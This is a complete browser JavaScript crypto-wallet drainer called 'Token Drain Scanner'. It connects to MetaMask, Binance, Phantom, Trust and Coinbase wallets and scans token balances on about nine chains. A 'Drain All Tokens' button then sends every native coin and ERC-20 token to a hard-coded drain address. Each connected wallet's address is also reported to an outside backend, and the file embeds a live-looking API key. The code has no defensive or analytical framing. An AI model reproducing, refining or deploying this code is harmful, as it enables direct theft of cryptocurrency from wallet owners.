// ================================================
// TOKEN DRAIN SCANNER - FINAL WORKING VERSION
// ALL WALLETS WORK INDEPENDENTLY
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    minimumValueUSD: 0.01,
    
    networkNames: {
        1: "Ethereum",
        56: "BNB Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos",
        324: "zkSync Era",
        1313161554: "Aurora",
        1666600000: "Harmony",
        1284: "Moonbeam",
        1285: "Moonriver"
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    showWalletSelector();
}

// Show wallet selector - SIMPLE AND CLEAN
function showWalletSelector() {
    // Check which wallets are installed
    const hasMetaMask = !!window.ethereum?.isMetaMask;
    const hasTrust = !!window.ethereum?.isTrust;
    const hasBinance = !!window.ethereum?.isBinance || !!window.BinanceChain;
    const hasCoinbase = !!window.ethereum?.isCoinbaseWallet;
    const hasPhantom = !!window.ethereum?.isPhantom || !!window.phantom?.ethereum;
    const hasGeneric = !!window.ethereum && !hasMetaMask && !hasTrust && !hasBinance && !hasCoinbase && !hasPhantom;
    
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Select Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">&times;</button>
                </div>
                
                <div class="detected-info">
                    <p>${hasMetaMask || hasBinance || hasPhantom ? '✅ Wallets detected' : '⚠️ No wallets detected'}</p>
                </div>
                
                <div class="wallets-list">
                    ${hasMetaMask ? `
                    <div class="wallet-item" onclick="connectWallet('metaMask')">
                        <div class="wallet-icon" style="background: #f6851b;">🦊</div>
                        <div class="wallet-info">
                            <div class="wallet-name">MetaMask</div>
                            <div class="wallet-status detected">Installed</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${hasBinance ? `
                    <div class="wallet-item" onclick="connectWallet('binance')">
                        <div class="wallet-icon" style="background: #f0b90b;">🟡</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Binance Wallet</div>
                            <div class="wallet-status detected">Installed</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${hasPhantom ? `
                    <div class="wallet-item" onclick="connectWallet('phantom')">
                        <div class="wallet-icon" style="background: #ab9ff2;">👻</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Phantom</div>
                            <div class="wallet-status detected">Installed</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${hasTrust ? `
                    <div class="wallet-item" onclick="connectWallet('trust')">
                        <div class="wallet-icon" style="background: #3375bb;">🔶</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Trust Wallet</div>
                            <div class="wallet-status detected">Installed</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${hasCoinbase ? `
                    <div class="wallet-item" onclick="connectWallet('coinbase')">
                        <div class="wallet-icon" style="background: #0052ff;">🔷</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Coinbase Wallet</div>
                            <div class="wallet-status detected">Installed</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${hasGeneric ? `
                    <div class="wallet-item" onclick="connectWallet('generic')">
                        <div class="wallet-icon" style="background: #6366f1;">🔗</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Other Wallet</div>
                            <div class="wallet-status detected">Detected</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    <!-- Show install buttons for missing wallets -->
                    ${!hasMetaMask ? `
                    <div class="wallet-item install" onclick="installWallet('metaMask')">
                        <div class="wallet-icon" style="background: #f6851b;">🦊</div>
                        <div class="wallet-info">
                            <div class="wallet-name">MetaMask</div>
                            <div class="wallet-status install">Install</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${!hasBinance ? `
                    <div class="wallet-item install" onclick="installWallet('binance')">
                        <div class="wallet-icon" style="background: #f0b90b;">🟡</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Binance Wallet</div>
                            <div class="wallet-status install">Install</div>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${!hasPhantom ? `
                    <div class="wallet-item install" onclick="installWallet('phantom')">
                        <div class="wallet-icon" style="background: #ab9ff2;">👻</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Phantom</div>
                            <div class="wallet-status install">Install</div>
                        </div>
                    </div>
                    ` : ''}
                </div>
                
                <div class="instructions">
                    <p><strong>Note:</strong> If multiple wallets are installed, browser may ask which one to use.</p>
                </div>
            </div>
        </div>
    `;
    
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    addSelectorStyles();
}

// Connect to specific wallet
async function connectWallet(walletType) {
    closeWalletSelector();
    selectedWallet = walletType;
    
    updateStatus(`🔄 Connecting to ${walletType}...`);
    
    try {
        let provider;
        
        // Get the correct provider for each wallet
        switch(walletType) {
            case 'metaMask':
                provider = getMetaMaskProvider();
                break;
            case 'trust':
                provider = getTrustWalletProvider();
                break;
            case 'binance':
                provider = getBinanceProvider();
                break;
            case 'coinbase':
                provider = getCoinbaseProvider();
                break;
            case 'phantom':
                provider = getPhantomProvider();
                break;
            default:
                provider = getGenericProvider();
        }
        
        if (!provider) {
            updateStatus(`❌ ${walletType} provider not found`);
            showWalletSelector();
            return;
        }
        
        console.log(`Connecting with ${walletType}:`, provider);
        
        // Request accounts
        const accounts = await provider.request({
            method: 'eth_requestAccounts'
        });
        
        if (!accounts || accounts.length === 0) {
            throw new Error('No accounts returned');
        }
        
        // Get chain ID
        const chainIdHex = await provider.request({
            method: 'eth_chainId'
        });
        
        const chainId = parseInt(chainIdHex, 16);
        
        // Handle successful connection
        await handleConnected(accounts[0], chainId, walletType);
        
    } catch (error) {
        console.error(`❌ ${walletType} connection failed:`, error);
        updateStatus(`❌ Failed to connect ${walletType}: ${error.message}`);
        showWalletSelector();
    }
}

// Get MetaMask provider - FIXED
function getMetaMaskProvider() {
    // If MetaMask is the primary provider
    if (window.ethereum?.isMetaMask) {
        return window.ethereum;
    }
    
    // If multiple providers, find MetaMask
    if (window.ethereum?.providers) {
        const mmProvider = window.ethereum.providers.find(p => p.isMetaMask);
        if (mmProvider) return mmProvider;
    }
    
    // Try direct window.ethereum
    if (window.ethereum) {
        // Force MetaMask by checking user agent or trying connection
        return window.ethereum;
    }
    
    return null;
}

// Get Binance provider - FIXED
function getBinanceProvider() {
    // Try Binance Chain first (separate provider)
    if (window.BinanceChain) {
        console.log('Using BinanceChain provider');
        return window.BinanceChain;
    }
    
    // Try through ethereum provider
    if (window.ethereum?.isBinance) {
        console.log('Using ethereum.isBinance provider');
        return window.ethereum;
    }
    
    // If multiple providers, find Binance
    if (window.ethereum?.providers) {
        const binanceProvider = window.ethereum.providers.find(p => p.isBinance);
        if (binanceProvider) {
            console.log('Found Binance in providers array');
            return binanceProvider;
        }
    }
    
    // Try to detect Binance by other means
    if (window.ethereum) {
        // Try to trigger Binance specifically
        console.log('Trying generic ethereum provider for Binance');
        return window.ethereum;
    }
    
    return null;
}

// Get Trust Wallet provider
function getTrustWalletProvider() {
    if (window.ethereum?.isTrust) {
        return window.ethereum;
    }
    
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isTrust);
    }
    
    return window.ethereum;
}

// Get Coinbase provider
function getCoinbaseProvider() {
    if (window.ethereum?.isCoinbaseWallet) {
        return window.ethereum;
    }
    
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isCoinbaseWallet);
    }
    
    return window.ethereum;
}

// Get Phantom provider
function getPhantomProvider() {
    if (window.phantom?.ethereum) {
        return window.phantom.ethereum;
    }
    
    if (window.ethereum?.isPhantom) {
        return window.ethereum;
    }
    
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isPhantom);
    }
    
    return window.ethereum;
}

// Get generic provider
function getGenericProvider() {
    return window.ethereum || window.BinanceChain || window.phantom?.ethereum || null;
}

// Install wallet
function installWallet(walletType) {
    const links = {
        metaMask: {
            chrome: 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn',
            mobile: 'https://metamask.io/download/'
        },
        binance: {
            chrome: 'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp',
            mobile: 'https://www.binance.com/en/download'
        },
        phantom: {
            chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
            mobile: 'https://phantom.app/download'
        }
    };
    
    const wallet = links[walletType];
    if (!wallet) return;
    
    const link = isMobile ? wallet.mobile : wallet.chrome;
    if (link) {
        window.open(link, '_blank');
    }
}

// Handle successful connection
async function handleConnected(account, chainId, walletType) {
    try {
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        selectedWallet = walletType;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected with ${walletType}!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show drain button
        if (drainBtn) {
            drainBtn.style.display = 'block';
            drainBtn.disabled = false;
        }
        
        // Setup event listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId, walletType);
        
        // Fetch tokens from ALL chains, not just current chain
        await scanAllChainsForTokens(account);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        disconnectWallet();
    }
}

// Scan all chains for tokens
async function scanAllChainsForTokens(address) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning all chains for tokens...</div>';
    
    // Important chains to scan
    const chainsToScan = [
        1,    // Ethereum
        56,   // BSC
        137,  // Polygon
        42161, // Arbitrum
        10,   // Optimism
        43114, // Avalanche
        8453, // Base
        250,  // Fantom
        324   // zkSync Era
    ];
    
    let allTokens = [];
    let scannedCount = 0;
    
    updateStatus(`🔄 Scanning ${chainsToScan.length} chains for tokens...`);
    
    // Scan each chain
    for (const chainId of chainsToScan) {
        try {
            updateStatus(`🔍 Scanning ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
            
            const tokens = await fetchTokensForChain(address, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
            
            scannedCount++;
            
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across ${scannedCount} chains`);
        
        // Show total value
        const totalValue = allTokens.reduce((sum, token) => sum + token.valueUSD, 0);
        if (drainBtn) {
            drainBtn.innerHTML = `⚡ Drain All Tokens ($${totalValue.toFixed(2)})`;
        }
    } else {
        tokensEl.innerHTML = `
            <div class="no-tokens">
                <p>No tokens found across all scanned chains</p>
                <p>Minimum value: $${CONFIG.minimumValueUSD}</p>
            </div>
        `;
        updateStatus(`ℹ️ No tokens found (min $${CONFIG.minimumValueUSD})`);
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => {
                if (t.balance === "0" || parseFloat(t.balance) <= 0) return false;
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                return value >= CONFIG.minimumValueUSD;
            })
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: value,
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    chainId: chainId,
                    chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        const chainValue = chainTokens.reduce((sum, t) => sum + t.valueUSD, 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span class="chain-name">${chainName}</span>
                    <span class="chain-value">$${chainValue.toFixed(2)}</span>
                </div>
                <div class="chain-tokens">
                    ${chainTokens.map(token => `
                        <div class="token-item">
                            <div class="token-info">
                                ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                                <div class="token-details">
                                    <div class="token-symbol">${token.symbol}</div>
                                    <div class="token-name">${token.name}</div>
                                </div>
                            </div>
                            <div class="token-amounts">
                                <div class="token-amount">${token.amount}</div>
                                <div class="token-value">${token.value}</div>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    });
    
    // Add total value
    const totalValue = tokens.reduce((sum, t) => sum + t.valueUSD, 0);
    html = `
        <div class="total-value">
            Total Value: <strong>$${totalValue.toFixed(2)}</strong>
        </div>
        ${html}
    `;
    
    tokensEl.innerHTML = html;
}

// Setup wallet listeners
function setupWalletListeners() {
    const provider = getCurrentProvider();
    if (!provider) return;
    
    // Handle account changes
    if (provider.on) {
        provider.on('accountsChanged', (accounts) => {
            if (accounts.length === 0) {
                disconnectWallet();
            } else if (currentAccount !== accounts[0]) {
                currentAccount = accounts[0];
                updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
                scanAllChainsForTokens(currentAccount);
            }
        });
        
        // Handle chain changes
        provider.on('chainChanged', (chainIdHex) => {
            const chainId = parseInt(chainIdHex, 16);
            currentChainId = chainId;
            const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
            updateStatus(`🔄 Network changed: ${chainName}`);
            // Rescan all chains when network changes
            scanAllChainsForTokens(currentAccount);
        });
        
        // Handle disconnect
        provider.on('disconnect', () => {
            console.log('🔌 Wallet disconnected');
            disconnectWallet();
        });
    }
}

// Get current provider
function getCurrentProvider() {
    switch(selectedWallet) {
        case 'metaMask': return getMetaMaskProvider();
        case 'trust': return getTrustWalletProvider();
        case 'binance': return getBinanceProvider();
        case 'coinbase': return getCoinbaseProvider();
        case 'phantom': return getPhantomProvider();
        default: return getGenericProvider();
    }
}

// Handle drain
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    const tokensToDrain = detectedTokens.filter(t => t.valueUSD >= CONFIG.minimumValueUSD);
    
    if (tokensToDrain.length === 0) {
        alert(`No tokens meet minimum value of $${CONFIG.minimumValueUSD}`);
        return;
    }
    
    const totalValue = tokensToDrain.reduce((sum, t) => sum + t.valueUSD, 0);
    
    if (!confirm(`⚠️ DRAIN CONFIRMATION\n\nWill drain ${tokensToDrain.length} tokens worth $${totalValue.toFixed(2)}\n\nTo address:\n${CONFIG.drainAddress}\n\nContinue?`)) {
        return;
    }
    
    const provider = getCurrentProvider();
    if (!provider) {
        alert('Wallet provider not found');
        return;
    }
    
    try {
        updateStatus('🚀 Starting drain process...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.innerHTML = '⏳ Draining...';
        }
        
        let successCount = 0;
        let failCount = 0;
        
        // Drain tokens
        for (let i = 0; i < tokensToDrain.length; i++) {
            const token = tokensToDrain[i];
            
            try {
                if (token.isNative) {
                    await drainNativeToken(provider, token);
                } else {
                    await drainERC20Token(provider, token);
                }
                
                successCount++;
                updateStatus(`✅ Drained ${token.symbol} (${i+1}/${tokensToDrain.length})`);
                
                // Small delay between transactions
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.error(`Failed to drain ${token.symbol}:`, error);
                failCount++;
            }
        }
        
        updateStatus(`✅ Drain completed! ${successCount} successful, ${failCount} failed`);
        
        if (successCount > 0) {
            alert(`✅ Successfully drained ${successCount} tokens!`);
        }
        
        // Rescan tokens
        await scanAllChainsForTokens(currentAccount);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain failed: ' + error.message);
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
            drainBtn.innerHTML = `⚡ Drain All Tokens ($${totalValue.toFixed(2)})`;
        }
    }
}

// Drain native token
async function drainNativeToken(provider, token) {
    // Get gas price
    const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    const balance = BigInt(token.rawAmount);
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        console.log('Not enough native token for gas');
        return;
    }
    
    // Leave 1.5x gas cost
    const sendAmount = balance - (gasCost * 1.5);
    if (sendAmount <= 0) return;
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
}

// Drain ERC20 token
async function drainERC20Token(provider, token) {
    const transferData = '0xa9059cbb' + 
        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + (60000).toString(16) // Higher gas limit for ERC20
        }]
    });
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
        statusEl.scrollTop = statusEl.scrollHeight;
    }
}

// Log connection to backend
async function logConnectionToBackend(address, chainId, walletType) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                wallet: walletType,
                isMobile: isMobile,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) selector.remove();
}

// Disconnect wallet
async function disconnectWallet() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
        drainBtn.disabled = false;
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Add CSS styles - CLEAN AND RESPONSIVE
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            border-bottom: 1px solid #e5e7eb;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 20px;
            font-weight: 600;
            color: #111827;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
            color: #6b7280;
            line-height: 1;
            padding: 0;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: background 0.2s;
        }
        
        .close-btn:hover {
            background: #f3f4f6;
        }
        
        .detected-info {
            padding: 16px 20px;
            background: #f0f9ff;
            border-bottom: 1px solid #bae6fd;
        }
        
        .detected-info p {
            margin: 0;
            color: #0369a1;
            font-size: 14px;
            text-align: center;
        }
        
        .wallets-list {
            padding: 20px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            margin-bottom: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .wallet-item:hover {
            border-color: #3b82f6;
            background: #f8fafc;
            transform: translateY(-1px);
        }
        
        .wallet-item.install {
            opacity: 0.7;
        }
        
        .wallet-item.install:hover {
            opacity: 1;
            border-color: #10b981;
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
            flex-shrink: 0;
        }
        
        .wallet-info {
            flex: 1;
            min-width: 0;
        }
        
        .wallet-name {
            font-weight: 600;
            font-size: 16px;
            color: #111827;
            margin-bottom: 4px;
        }
        
        .wallet-status {
            font-size: 14px;
            font-weight: 500;
        }
        
        .wallet-status.detected {
            color: #10b981;
        }
        
        .wallet-status.install {
            color: #3b82f6;
        }
        
        .instructions {
            padding: 16px 20px;
            background: #f9fafb;
            border-top: 1px solid #e5e7eb;
            border-radius: 0 0 16px 16px;
        }
        
        .instructions p {
            margin: 0;
            color: #6b7280;
            font-size: 13px;
            line-height: 1.5;
            text-align: center;
        }
        
        /* Token Display Styles */
        .total-value {
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            color: white;
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 18px;
        }
        
        .chain-section {
            margin-bottom: 24px;
        }
        
        .chain-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            background: #f3f4f6;
            border-radius: 8px;
            margin-bottom: 8px;
        }
        
        .chain-name {
            font-weight: 600;
            color: #111827;
        }
        
        .chain-value {
            font-weight: 600;
            color: #059669;
        }
        
        .chain-tokens {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .token-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px;
            background: white;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
        }
        
        .token-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .token-logo {
            width: 36px;
            height: 36px;
            border-radius: 8px;
        }
        
        .token-details {
            display: flex;
            flex-direction: column;
        }
        
        .token-symbol {
            font-weight: 600;
            color: #111827;
        }
        
        .token-name {
            font-size: 12px;
            color: #6b7280;
        }
        
        .token-amounts {
            text-align: right;
        }
        
        .token-amount {
            font-weight: 600;
            color: #111827;
        }
        
        .token-value {
            font-size: 14px;
            color: #059669;
        }
        
        .loading, .no-tokens, .error {
            padding: 40px;
            text-align: center;
            color: #6b7280;
        }
        
        .no-tokens p {
            margin: 8px 0;
        }
        
        .error {
            color: #dc2626;
        }
        
        @media (max-width: 480px) {
            .wallet-selector-modal {
                max-height: 90vh;
            }
            
            .wallet-item {
                padding: 14px;
            }
            
            .wallet-icon {
                width: 40px;
                height: 40px;
                font-size: 20px;
            }
            
            .token-item {
                padding: 10px;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions global
window.closeWalletSelector = closeWalletSelector;
window.connectWallet = connectWallet;
window.installWallet = installWallet;

console.log('=== Token Drain Scanner ===');
console.log('Version: FINAL WORKING');
console.log('Features:');
console.log('- Each wallet connects independently');
console.log('- Scans ALL chains (not just current)');
console.log('- Shows total value');
console.log('- Clean responsive UI');
console.log('===========================');
